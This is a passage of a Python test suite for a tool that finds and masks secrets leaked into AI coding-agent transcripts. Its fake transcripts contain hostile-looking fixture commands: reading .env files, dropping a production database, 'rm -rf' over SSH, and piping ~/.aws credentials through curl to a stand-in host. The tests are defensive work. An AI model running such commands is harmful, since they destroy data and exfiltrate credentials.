            + [{"type": "user", "message": {"content": [
                {"type": "tool_result", "tool_use_id": "c1",
                 "content": calls[0][3]}]}}])
        counts = []
        for source, paths in (("claude-code", {"claude-code": claude}),
                              ("codex", {"codex": root})):
            searched = clean.scan_sources(sources=[source], paths=paths)
            (finding,) = searched.findings.values()
            counts.append(finding["count"])
        self.assertEqual(counts, [2, 2])

    def test_one_in_a_grok_byte_list_is_found_and_masked(self):
        """Grok Build keeps a command's whole output only as a list of its
        bytes, and as text just its last lines. A value found in another
        agent's files was looked for there only as text."""
        import test_source_grok as gk
        [grok] = [a for a in af.AGENTS if a.id == "grok"]
        root = grok.root(self.home)
        path = grok.write(root, [("g1", "shell", "./build.sh", "", time.time() - 3000)])
        with open(path, encoding="utf-8") as fh:
            rows = [json.loads(line) for line in fh]
        output = "%s\n%s" % (self.PASSWORD, "built\n" * 20)
        rows[-1]["params"]["update"].update(
            rawOutput=gk.bash_output(output, "./build.sh", prompt=False),
            content=gk.text_content("built\n" * 10))
        af.write(path, [gk.line(r) for r in rows])
        with open(path, encoding="utf-8") as fh:
            self.assertNotIn(self.PASSWORD, fh.read())
        claude = self._claude([{"type": "user", "message": {"content": [
            {"type": "tool_result", "content": "DB_PASSWORD=%s\n" % self.PASSWORD}]}}])
        searched = clean.scan_sources(sources=["claude-code", "grok"],
                                      paths={"claude-code": claude, "grok": root},
                                      apply=True)
        (finding,) = searched.findings.values()
        self.assertEqual(sorted(finding["sources"]), ["claude-code", "grok"])
        self.assertIn(path, searched.changed)
        with open(path, encoding="utf-8") as fh:
            masked = [json.loads(line) for line in fh][-1]
        held = bytes(masked["params"]["update"]["rawOutput"]["output"])
        self.assertNotIn(self.PASSWORD.encode(), held)
        self.assertIn(b"ranwhat:redacted:", held)


class EveryCopyIsMasked(unittest.TestCase):
    """A value was masked only in the strings where it was found, beside a
    key that names it. A copy anywhere else in the same transcript, typed
    into a later command or quoted in a reply, stayed in plaintext, and
    the next clean said "No secrets found": an all-clear on a file that
    still held the password. "seen 1x" counted only the strings it was
    found in."""

    PASSWORD = "Qm7vT2xLp9Wk4Rz8"
    ACCENTED = "Wq8zN3xRt7pL2vKé9mB4"        # é in the file, as json.dumps writes it

    def setUp(self):
        backups = os.path.join(_tempdir(self, "bk-"), "backups")
        patch = mock.patch.object(clean, "BACKUP_ROOT", backups)
        patch.start()
        self.addCleanup(patch.stop)

    def _transcript(self):
        def call(i, command):
            return {"type": "assistant", "message": {"content": [
                {"type": "tool_use", "id": i, "name": "Bash",
                 "input": {"command": command}}]}}

        def result(i, text):
            return {"type": "user", "message": {"content": [
                {"type": "tool_result", "tool_use_id": i, "content": text}]}}

        lines = [call("a", "cat .env"),
                 result("a", "DB_PASSWORD=%s\nAPI_SECRET=%s\n"
                        % (self.PASSWORD, self.ACCENTED)),
                 call("b", "mysql -u root -p%s -e 'DROP DATABASE prod'" % self.PASSWORD),
                 call("c", "curl -u admin:%s https://x.test" % self.ACCENTED),
                 {"type": "assistant", "message": {"content": [
                     {"type": "text", "text": "Logged in with %s." % self.PASSWORD}]}}]
        d = _tempdir(self, "copies-")
        return af.write(os.path.join(d, "s.jsonl"), [json.dumps(line) for line in lines])

    def _copies(self, path, value):
        text = _read(path)
        return sum(text.count(form) for form in {value, json.dumps(value)[1:-1]})

    def test_every_copy_is_counted(self):
        findings, _changed = scan_file(self._transcript())
        counts = {f["hint"]: f["count"] for f in findings.values()}
        self.assertEqual(counts, {clean._hint(self.PASSWORD): 3,
                                  clean._hint(self.ACCENTED): 2})

    def test_every_copy_is_masked(self):
        path = self._transcript()
        findings, changed = scan_file(path, apply=True)
        self.assertTrue(changed)
        for value in (self.PASSWORD, self.ACCENTED):
            self.assertEqual(self._copies(path, value), 0, value)
        self.assertEqual(_read(path).count("ranwhat:redacted:"), 5)
        for line in _read(path).splitlines():
            json.loads(line)
        self.assertEqual(scan_file(path), ({}, False))

    def test_only_the_chosen_value_is_masked(self):
        path = self._transcript()
        findings, _ = scan_file(path)
        (fp,) = [fp for fp, f in findings.items()
                 if f["hint"] == clean._hint(self.PASSWORD)]
        scan_file(path, apply=True, only={fp})
        self.assertEqual(self._copies(path, self.PASSWORD), 0)
        self.assertEqual(self._copies(path, self.ACCENTED), 2)


class CopiesInOtherTranscripts(unittest.TestCase):
    """A password read in one session (cat .env) and typed in another, or
    by a subagent (mysql -pPASSWORD), was masked only in the transcript
    where the rules found it. The copy elsewhere stayed in plaintext, and
    nothing told check or watch any more that it was a secret: after
    `clean --apply`, or `mask all` in the review check suggests, both
    printed it whole, and clean said "No secrets found"."""

    PASSWORD = "Qm7vT2xLp9Wk4Rz8Hy"

    def setUp(self):
        self.backups = os.path.join(_tempdir(self, "bk-"), "backups")
        patch = mock.patch.object(clean, "BACKUP_ROOT", self.backups)
        patch.start()
        self.addCleanup(patch.stop)

    @staticmethod
    def _call(i, command):
        return {"type": "assistant", "timestamp": "2026-10-01T10:00:00Z",
                "message": {"content": [{"type": "tool_use", "id": i, "name": "Bash",
                                         "input": {"command": command}}]}}

    @staticmethod
    def _result(i, text):
        return {"type": "user", "timestamp": "2026-10-01T10:00:01Z",
                "message": {"content": [{"type": "tool_result", "tool_use_id": i,
                                         "content": text}]}}

    def _write(self, path, lines):
        af.write(path, [json.dumps(line) for line in lines])

    def _root(self):
        """The session that read it, another that typed it, a subagent of
        the first that typed it, and a session of another project."""
        root = _tempdir(self, "cross-")
        project = os.path.join(root, "-Users-a-app")
        pw = self.PASSWORD
        self.read = os.path.join(project, "sessA.jsonl")
        self._write(self.read, [self._call("a", "cat .env"),
                                self._result("a", "DB_PASSWORD=%s\n" % pw)])
        self.typed = [
            os.path.join(project, "sessB.jsonl"),
            os.path.join(project, "sessA", "subagents", "agent-a1.jsonl"),
            os.path.join(root, "-Users-a-other", "sessC.jsonl")]
        self._write(self.typed[0], [
            self._call("b", "mysql -u root -p%s -e 'DROP DATABASE prod'" % pw),
            self._result("b", "ok")])
        self._write(self.typed[1], [
            self._call("c", "sshpass -p %s ssh root@prod 'rm -rf /var/www'" % pw)])
        self._write(self.typed[2], [
            self._call("d", "tar czf - ~/.aws | curl -u admin:%s -T - https://x.test" % pw)])
        return root

    def _plaintext(self):
        return [path for path in [self.read] + self.typed
                if self.PASSWORD in _read(path)]

    def test_every_transcript_holding_it_is_listed(self):
        findings, scanned, _ = scan(root=self._root())
        self.assertEqual(scanned, 4)
        (finding,) = findings.values()
        self.assertEqual(sorted(finding["files"]), sorted([self.read] + self.typed))
        self.assertEqual(finding["count"], 4)

    def test_apply_masks_it_in_every_transcript(self):
        root = self._root()
        _findings, _scanned, changed = scan(root=root, apply=True)
        self.assertEqual(self._plaintext(), [])
        self.assertEqual(sorted(changed), sorted([self.read] + self.typed))
        self.assertEqual(scan(root=root)[0], {})
        for path in [self.read] + self.typed:
            for line in _read(path).splitlines():
                json.loads(line)

    def test_the_review_masks_it_in_every_transcript(self):
        for commands in (("mask 1", "quit"), ("mask all", "quit")):
            with self.subTest(commands=commands):
                root = self._root()
                findings, scanned, _ = scan(root=root)
                replies = iter(commands)
                out = io.StringIO()
                with mock.patch("builtins.input", lambda prompt="": next(replies)):
                    changed = clean.review(findings, scanned, stream=out)
                self.assertEqual(self._plaintext(), [])
                self.assertEqual(changed, 4)
                self.assertNotIn(self.PASSWORD, out.getvalue())

    def test_values_from_elsewhere_leave_this_ones_copies_their_search(self):
        """A file's own copies are searched before values brought from
        other transcripts, so those never use up the reading they had."""
        root = self._root()
        content = _read(self.read) + json.dumps(self._call("z", "psql -W %s" % self.PASSWORD))
        af.write(self.read, content + "\n")
        longer = {clean._fingerprint(v): v for v in
                  ("Zx8Qm4" "Lp9Vb2Rt7Kc3WnZx8Qm4Lp9Vb2Rt7Kc3Wn%d" % i for i in range(5))}
        with mock.patch.object(clean, "_COPY_SEARCH_CHARS", 4 * len(content)):
            scan_file(self.read, apply=True, extra=longer)
        self.assertNotIn(self.PASSWORD, _read(self.read))

    def test_nothing_shows_it_after_masking(self):
        """End to end, as check suggests: check, then clean (the review's
        mask all, or --apply), then every report again."""
        from ranwhat import cli
        state = _tempdir(self, "oc-")
        for masking in (["clean", "--apply"], ["clean"]):
            with self.subTest(masking=masking):
                root = self._root()
                where = ["--root", root]
                reports = (["check"] + where + ["--state-dir", state],
                           ["check", "--json"] + where + ["--state-dir", state],
                           ["watch"] + where + ["--state-dir", state],
                           ["watch", "--json"] + where + ["--state-dir", state],
                           ["clean", "--no-interactive"] + where,
                           ["clean", "--json", "--no-interactive"] + where)
                for argv in reports:
                    self.assertNotIn(self.PASSWORD, _cli(cli, argv))
                replies = iter(("mask all", "quit"))
                with mock.patch("builtins.input", lambda prompt="": next(replies)), \
                     mock.patch("sys.stdin.isatty", return_value=True):
                    self.assertNotIn(self.PASSWORD, _cli(cli, masking + where))
                self.assertEqual(self._plaintext(), [])
                for argv in reports:
                    self.assertNotIn(self.PASSWORD, _cli(cli, argv))
                self.assertIn("No secrets found", _cli(cli, reports[4]))


def _cli(cli, argv):
    out, err = io.StringIO(), io.StringIO()
    with mock.patch("sys.stdout", out), mock.patch("sys.stderr", err):
        try:
            cli.main(argv)
        except SystemExit:
            pass
    return out.getvalue() + err.getvalue()


class MaskingWhatIsKnown(unittest.TestCase):
    """mask_known masks values found elsewhere, which nothing in the text
    marks as secrets, including the part of one an … cuts off."""

    VALUE = "Xk9mPq" "2vRt7wLz4bN8cQ5dHs3fJy6gTu1aEe0iWo"

    def test_every_copy(self):
        text = "mysql -p%s -e 'x' ; echo %s" % (self.VALUE, self.VALUE)
        masked = clean.mask_known(text, [self.VALUE])
        self.assertNotIn(self.VALUE[4:-4], masked)
        self.assertEqual(masked.count(clean.DISPLAY_MASK % clean._hint(self.VALUE)), 2)

    def test_a_value_cut_at_either_end(self):
        hint = clean.DISPLAY_MASK % clean._hint(self.VALUE)
        self.assertEqual(clean.mask_known("…" + self.VALUE[-14:] + " ssh h rm -rf /x",
                                          [self.VALUE]),
                         "…" + hint + " ssh h rm -rf /x")
        self.assertEqual(clean.mask_known("rm -rf /x ; sshpass -p" + self.VALUE[:9] + "…",
                                          [self.VALUE]),
                         "rm -rf /x ; sshpass -p" + hint + "…")

    def test_other_text_is_left_alone(self):
        for text in ("…abc ssh", "…" + self.VALUE[-3:] + " x",
                     "rm -rf /x…", "ls -la", ""):
            with self.subTest(text=text):
                self.assertEqual(clean.mask_known(text, [self.VALUE]), text)

    def test_made_once_it_masks_what_each_text_holds(self):
        """check masks every action against every value, so the values are
        made ready once. It masks what asking each value of each text
        did, at either edge too, and for a word longer than the stretch of
        each value it indexes."""
        rnd = random.Random(20261002)
        alphabet = "abcXYZ019"
        values = ["".join(rnd.choice(alphabet) for _ in range(n))
                  for n in [8] * 30 + [9, 12, 16, 20, 40, 700]]
        known = clean.KnownValues(values)
        for _ in range(400):
            v = rnd.choice(values)
            parts = [" ".join(rnd.choice(values) for _ in range(rnd.randint(0, 2))),
                     "".join(rnd.choice(alphabet + " ") for _ in range(rnd.randint(0, 30)))]
            text = rnd.choice(["", "…"]) + v[rnd.randint(0, len(v) - 1):] + " " \
                + " ".join(parts) + " " + v[:rnd.randint(1, len(v))] + rnd.choice(["", "…"])
            with self.subTest(text=text[:80]):
                self.assertEqual(known.mask(text), _mask_each(text, values))
                self.assertEqual(clean.mask_known(text, values), _mask_each(text, values))


def _mask_each(text, values):
    """mask_known as it was: every value asked of the text, longest first."""
    ordered = sorted(set(values), key=lambda v: (-len(v), v))
    for value in ordered:
        if value in text:
            text = text.replace(value, clean.DISPLAY_MASK % clean._hint(value))
    if text.startswith("\u2026"):
        word = clean._FIRST_WORD.match(text, 1)
        shown, value = clean._shown_end(word.group() if word else "", ordered)
        if shown:
            text = "\u2026" + clean.DISPLAY_MASK % clean._hint(value) + text[1 + shown:]
    if text.endswith("\u2026"):
        words = text[:-1].split()
        word = words[-1] if words and not text[-2:-1].isspace() else ""
        shown, value = clean._shown_start(word, ordered)
        if shown:
            text = text[:-1 - shown] + clean.DISPLAY_MASK % clean._hint(value) + "\u2026"
    return text


# Deep enough that Python 3.9's json cannot read it, and that 3.14's reads
# it but json.dumps cannot write it back. Built as text, never by recursion.
DEEP = 100000


def _deep_dict(depth=DEEP):
    return '{"a":' * depth + "1" + "}" * depth


class OneLineNestedPastTheStack(unittest.TestCase):
    """A line nested past the stack, from someone else's writer, ended
    clean in a traceback. 3.9's json cannot read it, and clean --apply read
    every line back, those it never parsed too. 3.14's reads it, and then
    json.dumps could not write out a call's input to look for the file it
    reads, nor the line back once a secret in it was masked. Every other
    line is read and masked, and the odd ones kept as they were read."""

    KEY = "sk_" "live_" + "Zq8Lm3Np5Rt7Vx9Bc2Df4Gh6"
    OTHER = "8f3a9c2e1b7d4f6a" "0c5e8b2d7f1a4c9e"
    ODD = (
        "not json at all",
        "[" * DEEP + "]" * DEEP,
        '{"type":"assistant","message":{"content":[{"type":"tool_use",'
        '"id":"a","name":"Bash","input":{"command":"cat api/.env","x":'
        + _deep_dict() + '}}]}}',
        '{"type":"user","message":{"content":[{"type":"tool_result",'
        '"tool_use_id":"b","content":"JWT_ACCESS_SECRET=' + OTHER
        + '","deep":' + _deep_dict() + '}]}}',
    )

    def setUp(self):
        backups = os.path.join(_tempdir(self, "deep-bk-"), "backups")
        patch = mock.patch.object(clean, "BACKUP_ROOT", backups)
        patch.start()
        self.addCleanup(patch.stop)

    def _lines(self):
        result = json.dumps({"type": "user", "message": {"content": [
            {"type": "tool_result", "tool_use_id": "a",
             "content": "TOKEN=" + self.KEY}]}})
        return [line + "\n" for line in self.ODD + (result,)]

    def _transcript(self, root=None):
        d = os.path.join(root or _tempdir(self, "deep-"), "-tmp-deep")
        return af.write(os.path.join(d, "s.jsonl"), "".join(self._lines()))

    def test_a_line_nested_past_the_stack_is_skipped_and_the_rest_read(self):
        findings, changed = scan_file(self._transcript())
        self.assertIn(clean._fingerprint(self.KEY), findings)
        self.assertFalse(changed)

    def test_apply_masks_the_rest_and_keeps_the_odd_lines_as_read(self):
        path = self._transcript()
        _findings, changed = scan_file(path, apply=True)
        self.assertTrue(changed)
        with open(path, encoding="utf-8", newline="") as fh:
            after = fh.readlines()
        # Not assertEqual: a diff of these lines is megabytes.
        self.assertTrue(after[:len(self.ODD)] == self._lines()[:len(self.ODD)],
                        "an odd line was not kept as it was read")
        self.assertNotIn(self.KEY, after[-1])
        self.assertIn(REDACTION % clean._fingerprint(self.KEY), after[-1])

    def test_every_command_reads_on_and_clean_masks_the_rest(self):
        home = _tempdir(self, "deep-home-")
        root = os.path.join(home, "projects")
        path = self._transcript(root)
        # Nothing of this machine's own: no agent's variable points anywhere.
        env = {k: v for k, v in os.environ.items()
               if k in ("PATH", "TMPDIR", "TEMP", "TMP", "SYSTEMROOT")}
        env.update(HOME=home, USERPROFILE=home, NO_COLOR="1",
                   PYTHONIOENCODING="utf-8",
                   RANWHAT_HOME=os.path.join(home, "rw"),
                   PYTHONPATH=os.path.dirname(os.path.dirname(
                       os.path.abspath(__file__))))
        where = ["--root", root, "--days", "30"]
        state = ["--state-dir", os.path.join(home, "oc")]
        for argv in (["watch"] + state, ["check"] + state,
                     ["clean", "--no-interactive"],
                     ["clean", "--apply", "--no-interactive"]):
            with self.subTest(argv=argv):
                run = subprocess.run(
                    [sys.executable, "-m", "ranwhat"] + argv + where,
                    capture_output=True, timeout=60, env=env,
                    stdin=subprocess.DEVNULL)
                err = run.stderr.decode("utf-8", "replace")
                self.assertNotIn("Traceback", err)
                self.assertEqual(run.returncode, 0, err[-400:])
                self.assertNotIn(self.KEY, run.stdout.decode("utf-8", "replace"))
        self.assertFalse(self.KEY in _read(path), "the key is still in the transcript")
